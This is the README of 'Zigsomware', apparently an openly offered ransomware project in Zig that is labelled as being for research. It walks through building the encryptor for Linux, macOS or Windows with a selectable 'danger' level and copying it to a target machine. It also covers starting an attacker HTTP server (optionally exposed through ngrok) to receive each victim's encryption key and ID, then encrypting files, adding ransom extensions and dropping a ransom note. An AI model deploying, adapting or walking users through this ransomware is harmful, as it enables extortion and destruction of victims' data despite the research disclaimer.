# :t-rex: Zigsomware :t-rex:

Zigsomware is a ransomware example written in Zig, for research purpose.  
Its target is cross-platform, supporting Linux, madOS, Windows, etc.

<br />

## Features

The Zigsomware is composesd of two executable files:

- `zigsom`:
    - Encrypts files with XChaCha20-Poly1305 algorithm.
    - Sends the encryption key and the victim ID to the specified server.

- `unlock`:
    - Decrypts the files that are encrypted by `zigsom`.

<br />

## Requirements

- Zig version 0.14.0+

<br />

## :warning: ATTENTION

- The project aims to help security research and educational purposes. Do not use it on any systems not under your control.
- Don't use it on your personal machine. Instead, use it on your test environment such as VM.
- Anyway, use it at your own risk.

<br />

# Tutorial

## 1. Build

First clone the repository:

```sh
git clone https://github.com/hideckies/zigsomware.git
cd zigsomware
```

And build the project with specified options:

```sh
# -Dtarget: The CPU architecture, OS, and ABI to build for e.g. 'x86_64-linux', 'x86_64-macos', 'x86_64-windows'
# -Ddir: Path of the directory to start encryption (default: './victim/')
# -Dserver_host: Server address
# -Dserver_port: Server port
# -Dserver_path: The URL path of the server to receive the encryption key and the victim ID.
# -Dlevel: The level at which Zigsomware encrypts files. The higher the level, the more files will be encrypted. [1: safe, 2: normal, 3: danger] (default: 1)
zig build \
-Dtarget=x86_64-windows \
-Ddir=./victim/ \
-Dserver_host=127.0.0.1 -Dserver_port=4444 -Dserver_path=/ \
-Dlevel=1
```

As above, we need to specify the server host/port/path for allowing the Zigsomware to send the encryption key to. We can also set other servers/endpoints such as `ngrok`.  

After building, the executables are generated under `zig-out` directory:

```sh
# e.g.
file ./zig-out/bin/unlock.exe
file ./zig-out/bin/zigsom.exe
```

Transfer the `zigsom.exe` to the target machine.  
Do not transfer the `unlock.exe` yet because it is used for decryption.

## 2. Start Attacker Server

To receive the encryption key and the victim ID from the `zigsom`, we need to start the web server in your local machine. Here, we simply run Python HTTP server.

```sh
python3 -m http.server 4444
```

## 3. Encryption

In the target machine, execute the `zigsom`. We assume that the `victim` directory exist in the current directory.

```sh
# Check if the 'victim' directory exists.
dir .\victim

# Now execute it to encrypt files under the 'victim' directory.
.\zigsom.exe
```

When executed, the `zigsom` does the following:

1. Generates the encryption key and encodes with Base64.
2. Sends **the Base64-encoded encryption key** and **the victim ID** to our attacker server (`http://127.0.0.1:4444/?id=123456&key=xxxxxxxxxxxxxxxxxx`).
3. Using the encryption key, it encrypts files under the `victim` directory that has been specified during `zig build`.
4. Adds ransom extensions (`.zigsom`) for each file.
5. Places a ransom note (`README.txt`) in the `victim` directory.

The encryption key and the victim ID can be seen in our attacker server's log as below:

```txt
127.0.0.1 - - [08/Sep/2024 21:42:52] "GET /?id=116219480&key=WN_1jH2JobcU3_9pwxXosWfmnlvB4Ju1pKQiZPRrf8Y HTTP/1.1" 200 -
```

This key (`WN_1jH2JobcU3_9pwxXosWfmnlvB4Ju1pKQiZPRrf8Y` here) is used for decryption.

*The `zigsom` sends **HTTPS** request at first. If it is failed, the `zigsom` sends **HTTP** request instead.  

## 4. Decryption

To decrypt the files, we (or rather, the victims) execute `unlock.exe` with **the Base64-encoded encryption key** and the specified directory (the `victim` here):

```sh
# -k: Base64-encoded encryption key
.\unlock.exe -k WN_1jH2JobcU3_9pwxXosWfmnlvB4Ju1pKQiZPRrf8Y .\victim\
```

When executed, the `unlock` does the following:

1. Decodes **the Base64-encoded encryption key**.
2. Decrypts files under the direcotry (`.\victim\`) using the encryption key.
3. Removes the ransom extensions (`.zigsom`) for each file.

